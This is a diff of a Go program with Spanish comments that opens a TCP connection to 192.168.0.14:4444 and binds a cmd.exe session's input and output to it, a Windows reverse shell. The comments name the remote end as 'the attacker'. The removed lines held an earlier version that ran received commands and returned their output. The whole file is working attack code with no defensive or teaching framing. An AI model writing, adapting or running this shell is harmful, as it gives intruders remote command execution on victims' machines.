@@ -1,88 +1,54 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"io"
 	"net"
-	"os"
 	"os/exec"
 	"strings"
 )
 
 func main() {
-    c, err := net.Dial("tcp", "192.168.0.14:4444")
-    if err != nil {
-        panic(err)
-    }
-    defer c.Close()
+	c, err := net.Dial("tcp", "192.168.0.14:4444")
+	if err != nil {
+		panic(err)
+	}
+	defer c.Close()
 
-    // Define el directorio de trabajo inicial
-    currentDir := "C:\\" // Ajusta esto si deseas empezar desde otro directorio
+	// Crear una sesión persistente de cmd.exe
+	cmd := exec.Command("cmd")
+	cmd.Stdin = c
+	cmd.Stdout = c
+	cmd.Stderr = c
 
-    go func() {
-        reader := bufio.NewReader(os.Stdin)
-        for {
-            fmt.Print("Comando a enviar: ")
-            command, _ := reader.ReadString('\n')
-            c.Write([]byte(command))
-        }
-    }()
+	// Iniciar la sesión de cmd.exe
+	go func() {
+		err := cmd.Run()
+		if err != nil {
+			fmt.Println("Error al ejecutar la sesión de cmd:", err)
+		}
+	}()
 
-    go func() {
-        responseReader := bufio.NewReader(c)
-        for {
-            response, err := responseReader.ReadString('\n')
-            if err == io.EOF {
-                break
-            }
-            if err != nil {
-                fmt.Println("Error al leer la respuesta:", err)
-                return
-            }
-            fmt.Print("Respuesta recibida: ", response)
-        }
-    }()
+	// Leer comandos desde el atacante y enviarlos a la sesión de cmd
+	for {
+		buffer := make([]byte, 1024)
+		n, err := c.Read(buffer)
+		if err != nil {
+			if err == io.EOF {
+				fmt.Println("Conexión cerrada")
+				break
+			}
+			fmt.Println("Error al leer el comando:", err)
+			continue
+		}
 
-    for {
-        buffer := make([]byte, 1024)
-        n, err := c.Read(buffer)
-        if err != nil {
-            fmt.Println("Error al leer el comando:", err)
-            break
-        }
+		receivedCommand := strings.TrimSpace(string(buffer[:n]))
+		fmt.Println("Comando recibido:", receivedCommand)
 
-        receivedCommand := strings.TrimSpace(string(buffer[:n]))
-        fmt.Println("Comando recibido:", receivedCommand)
-
-        // Detectar y procesar comandos 'cd'
-        if strings.HasPrefix(receivedCommand, "cd") {
-            args := strings.Split(receivedCommand, " ")
-            if len(args) > 1 {
-                // Actualizar el directorio actual
-                if args[1] == ".." {
-                    currentDir = strings.TrimRight(currentDir, "\\") + "\\.."
-                } else {
-                    currentDir = currentDir + "\\" + args[1]
-                }
-            }
-            c.Write([]byte("Directorio cambiado a: " + currentDir + "\n"))
-            continue
-        }
-
-        // Ejecutar el comando en el directorio actual
-        cmd := exec.Command("cmd", "/C", receivedCommand)
-        cmd.Dir = currentDir // Configurar el directorio actual
-        output, err := cmd.CombinedOutput()
-        if err != nil {
-            fmt.Println("Error al ejecutar el comando:", err)
-        }
-
-        if len(output) == 0 {
-            output = []byte("Comando ejecutado sin salida\n")
-        }
-
-        // Enviar la salida de vuelta al atacante
-        c.Write(output)
-    }
+		// Escribir el comando en la sesión de cmd para ejecutarlo
+		_, err = c.Write([]byte(receivedCommand + "\n"))
+		if err != nil {
+			fmt.Println("Error al enviar el comando a cmd:", err)
+		}
+	}
 }
